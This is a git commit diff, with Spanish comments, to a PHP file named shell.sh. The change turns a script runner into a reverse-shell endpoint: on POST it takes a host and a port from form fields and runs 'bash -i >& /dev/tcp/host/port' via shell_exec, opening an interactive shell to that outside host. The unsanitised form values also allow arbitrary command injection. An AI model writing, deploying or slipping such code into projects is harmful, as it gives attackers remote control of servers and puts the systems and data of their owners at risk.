679d9facfb6e3219ff4a2e411663d0591b6fb6a9
M4THsb09 <104104816+M4THsb09@users.noreply.github.com>
2024-01-08 16:26:31 -0300

    Update2 shell.sh
    se añadió la funcionalidad de botones

--- shell.sh
+++ shell.sh
@@ -1,11 +1,23 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Ejecuta el script de Bash de manera segjura
-    $output = shell_exec('bash test.sh 2>&1');
-    
-    // Devuelve la salida del script como respuesta JSON
-    header('Content-Type: application/json');
-    echo json_encode(['output' => $output]);
+    // Obtén los valores de los campos del formulario
+    $primercampo = $_POST['primercampo'];
+    $segundocampo = $_POST['segundocampo'];
+
+    // Verifica si se han proporcionado valores para los campos
+    if (!empty($primercampo) && !empty($segundocampo)) {
+        // Construye el comando Bash con los valores proporcionados
+        $comandoBash = "bash -i >& /dev/tcp/$primercampo/$segundocampo 0>&1";
+
+        // Ejecuta el comando Bash
+        $output = shell_exec($comandoBash);
+
+        // Devuelve la salida del script como respuesta JSON
+        header('Content-Type: application/json');
+        echo json_encode(['output' => $output]);
+    } else {
+        echo "Error: Debes proporcionar valores para ambos campos.";
+    }
 } else {
     // Redirecciona si se intenta acceder directamente a este archivo
     header('Location: index.html');
